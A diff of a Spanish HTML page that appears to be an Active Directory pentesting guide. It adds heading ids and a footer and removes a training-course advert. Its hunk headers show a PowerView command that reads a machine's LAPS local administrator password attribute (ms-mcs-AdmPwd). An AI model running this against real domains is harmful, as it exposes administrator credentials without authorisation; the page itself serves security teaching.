         </ul>
 
 
-        <h3>Resumen de Puntos Clave</h3>
+        <h3 id="resumen-puntos">Resumen de Puntos Clave</h3>
 
         <ul>
 
@@ -863,7 +872,7 @@ Get-DomainComputer MSEDGEWIN10 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-Adm
         </ul>
 
 
-        <h3>Notas</h3>
+        <h3 id="notas">Notas</h3>
 
         <ul>
 
@@ -877,69 +886,11 @@ Get-DomainComputer MSEDGEWIN10 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-Adm
 
         </ul>
 
+        <hr>
 
-        <div class="page-number">17 | Página</div>
-
-
-        <h2>ÚNETE A NUESTROS PROGRAMAS DE ENTRENAMIENTO</h2>
-
-        <h3>PRINCIPIANTE</h3>
-
-        <ul>
-
-            <li>Hacking Ético</li>
-
-            <li>Pentest de Red</li>
-
-            <li>Bug Bounty</li>
-
-            <li>Pentest Inalámbrico</li>
-
-            <li>Esenciales de Seguridad de Red</li>
-
-        </ul>
-
-        <h3>AVANZADO</h3>
-
-        <ul>
-
-            <li>Burp Suite Pro</li>
-
-            <li>Servicios Web-API</li>
-
-            <li>Metasploit Avanzado</li>
-
-            <li>VAPT de Infraestructura Pro</li>
-
-            <li>Informática Forense</li>
-
-            <li>Pentest de Android</li>
-
-            <li>CTF</li>
-
-        </ul>
-
-        <h3>EXPERTO</h3>
-
-        <ul>
-
-            <li>Operación de Equipo Rojo</li>
-
-            <li>API's - Tácticas de Ataque MITRE</li>
-
-            <li>Ataque a Active Directory</li>
-
-            <li>Evaluación de Seguridad MSSQL</li>
-
-            <li>Escalada de Privilegios</li>
-
-            <li>Windows</li>
-
-            <li>Linux</li>
-
-        </ul>
-
-    </div>
+        <footer style="text-align: center; margin-top: 40px; padding: 20px; background-color: #f4f4f4; border-radius: 8px;">
+            <p>&copy; 2025 - <a href="pildoras.html" style="color: #333; text-decoration: none;">Volver a Píldoras</a></p>
+        </footer>
 
 </body>
 
